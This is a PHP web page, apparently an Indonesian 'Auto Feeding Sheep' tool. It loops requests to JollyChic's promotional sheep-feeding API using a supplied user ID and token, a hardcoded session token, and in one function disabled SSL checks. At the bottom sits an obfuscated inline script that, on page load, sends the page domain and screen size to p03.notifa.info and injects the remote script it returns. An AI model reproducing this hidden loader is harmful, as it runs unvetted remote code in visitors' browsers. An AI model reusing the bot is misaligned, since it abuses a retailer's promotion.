<?php

function jolly($userid, $usertoken, $jum){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://h5server.jollychic.com/active/sheepFeed/getFood.do?callback=topicCallback1533793153536&appTypeId=0&lang=12&countryCode=ID&appVersion=7.1.1&currency=IDR&terminalType=1&timestamp=1533792012760&cookieId=c81dbd56-5ecf-49ed-9e0e-ef67ad30c1e4&userId=$userid&userToken=$usertoken&token=FfHKVDLRxPrCabMKNVV4KFJ%2BXve5hz0O3cjI7sjZbP3igP5v9%2F0zlAQQ&type=$jum&edtionCatId=77628&_=1533793108201");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://h5server.jollychic.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output;
}
function pakan($uid, $usertoken){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://h5server.jollychic.com/active/sheepFeed/feed.do?callback=topicCallback1533793176459&appTypeId=0&lang=12&countryCode=ID&appVersion=7.1.1&currency=IDR&terminalType=1&timestamp=1533792012760&cookieId=c81dbd56-5ecf-49ed-9e0e-ef67ad30c1e4&userId=$uid&userToken=$usertoken&token=FfHKVDLRxPrCabMKNVV4KFJ%2BXve5hz0O3cjI7sjZbP3igP5v9%2F0zlAQQ&_=1533793108210");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_REFERER, 'https://h5server.jollychic.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
}
$uid = "";
$usertoken = "";
$jumlah = "";
$jeda = "";
?>

<html>
<head>
    <meta charset="utf-8">
    <title>Auto Feeding Sheep</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Auto Feeding Sheep">
    <meta name="author" content="SGB Team,ctrndk">
    <link href="http://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <link href="http://wenzhixin.net.cn/p/bootstrap-table/src/bootstrap-table.css" rel="stylesheet" type="text/css" />
    <link href="http://cdn.kendostatic.com/2014.1.318/styles/kendo.common.min.css" rel="stylesheet" />
    <link href="http://cdn.kendostatic.com/2014.1.318/styles/kendo.bootstrap.min.css" rel="stylesheet" />
    <link href="http://protostrap.com/Assets/gv/css/gv.bootstrap-form.css" rel="stylesheet" type="text/css" />
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <form action="" method="post" id="formentry" class="form-horizontal" role="form" data-parsley-validate novalidate>
                <div class="container-fluid shadow">
                    <div class="row">
                        <div id="valErr" class="row viewerror clearfix hidden">
                            <div class="alert alert-danger">Diisi dong !!</div>
                        </div>
                        <div id="valOk" class="row viewerror clearfix hidden">
                            <div class="alert alert-success">Oke ekse aja! ..</div>
                        </div>

                                    <div class="row">
                                        <div class="col-md-12"><div class="form-group" style="display: block;" rel="popover" data-trigger="hover" data-content="User ID" data-original-title="">
			    <label class="control-label control-label-left col-sm-3" for="uid">User ID<span class="req"> *</span></label>
			    <div class="controls col-sm-9">
                    
                <input id="uid" type="text" class="form-control k-textbox" data-role="text" placeholder="7sas575x" value="<?php echo $uid;?>" required="required" name="uid" data-parsley-errors-container="#errId1"><span id="errId1" class="error"></span></div>
                
		</div><div class="form-group" rel="popover" data-trigger="hover" data-content="Tokenmu" data-original-title="">
			    <label class="control-label control-label-left col-sm-3" for="usertoken">Token<span class="req"> *</span></label>
			    <div class="controls col-sm-9">
                    
                <input id="usertoken" type="text" class="form-control k-textbox" data-role="text" name="usertoken" placeholder="shaAYSaksjkas" value="<?php echo $usertoken;?>" required="required" data-parsley-errors-container="#errId2"><span id="errId2" class="error"></span></div>
                
		</div><div class="form-group" rel="popover" data-trigger="hover" data-content="Jumlah" data-original-title="">
			    <label class="control-label control-label-left col-sm-3" for="jumlah">Jumlah<span class="req"> *</span></label>
			    <div class="controls col-sm-9">
                    
                <input id="jumlah" type="number" class="form-control k-textbox" data-role="text" placeholder="999" name="jumlah" value="<?php echo $jumlah;?>" required="required" data-parsley-errors-container="#errId3"><span id="errId3" class="error"></span></div>
                
		</div><div class="form-group" rel="popover" data-trigger="hover" data-content="Jeda 0-9999" data-original-title="">
			    <label class="control-label control-label-left col-sm-3" for="jeda">Jeda<span class="req"> *</span></label>
			    <div class="controls col-sm-9">
                    
                <input id="jeda" type="number" class="form-control k-textbox" data-role="text" name="jeda" value="<?php echo $jeda;?>" required="required" placeholder="0-9999" data-parsley-errors-container="#errId4"><span id="errId4" class="error"></span></div>
                
		</div><div class="form-group pull-right">
			    
			    
                
		<button type="submit" class="btn btn-primary" name="submit">Start</button> <button type="reset" class="btn btn-info" name="reset">reset</button> </div></div>
                                    </div>
                                


                    </div>
                </div>
            </form>
        </div>
    
        <div class="container-fluid shadow">
        	<center>
        <pre>
     	<?php
if (isset($_POST['submit'])) {
$uid = $_POST['uid'];
$usertoken = $_POST['usertoken'];
$jumlah = $_POST['jumlah'];
$jeda = $_POST['jeda'];
for($a=0;$a<$jumlah;$a++){
	$jum = rand(123,$jumlah);
	$jum1 = rand($jum,$jumlah);
	$chance = jolly($uid, $usertoken, $jum);
	$chance1 = jolly($uid, $usertoken, $jum1);
	$pakan = pakan($uid, $usertoken);
	sleep($jeda);
	flush();
}
echo "\n <hr>";
	
}
?>
<br>&copy; SGB-Team 
        </pre>
    </center>
        </div>
    
    </div>
    
    <script src="http://cdn.kendostatic.com/2014.1.318/js/jquery.min.js"></script>
    <script src="http://protostrap.com/Assets/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="http://wenzhixin.net.cn/p/bootstrap-table/src/bootstrap-table.js" type="text/javascript"></script>

    <script src="http://protostrap.com/Assets/inputmask/js/jquery.inputmask.js" type="text/javascript"></script>
    <script src="http://cdn.kendostatic.com/2014.1.318/js/kendo.all.min.js"></script>
    <script src="http://protostrap.com/Assets/parsely/parsley.extend.js" type="text/javascript"></script>
    <script src="http://protostrap.com/Assets/parsely/2.0/parsley.js" type="text/javascript"></script>
    <script src="http://protostrap.com/Assets/download.js" type="text/javascript"></script>
    <script src="http://protostrap.com/Assets/protostrap.js" type="text/javascript"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mR8Jk8An0rkuEKdoU602rQ%2fTFENSv9ltGw1hF7t193Vl51Vajobo50MtcGJBgb43P6m5KIYXfPmQKvyWTmdFBqY2phoqGvOB7erBoIBmI%2bvSB7pbtJUSlXbL%2fmN2bZuLQUfkOZU2bSGKaRYq4GxDo8Yq%2fVmICIV0CubBVFSKM195Lp4w0bwta%2bumzFadtSagf1epuSHTjTnGTBdZBNFon5o9N6F1HASbtVl%2bMiApPOmhwqR6OeDfONnaWYwrLAaxT7YfO9i17XW5AhW8Dg8dz6d4Eob1wRMXVgJhRB3VS%2fOZ6366ZCzSLNU6ZmplZdhuPvMoNPhBATlXm4j0fbEHgiz%2fUVhPJhYmVvE%2bRViNQWtNXpwdkox2o%2fK9OEdE8xb6jnDZvvXFHHLg%2fQzO9grJz%2fBZHMq62CsLZm22rovuDS9xkM2fiu1kI4dNzJpjWR9vGDrINoefI2F6BREzot5Nj%2bE9zYdDs71bwpzXupiBaN2%2bsT2wvBn2NGBsRgN2CptWh0nLPlVvHI0rcTVyUC0dYdVPP%2fstKpi86kwFmGISztEaAW6Uu2akxymqyxRA1NuP1D81Lo3ZZ4nDExVttXRr44uI%2besD8eNQn%2fOLCC1sXbKM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    </html>
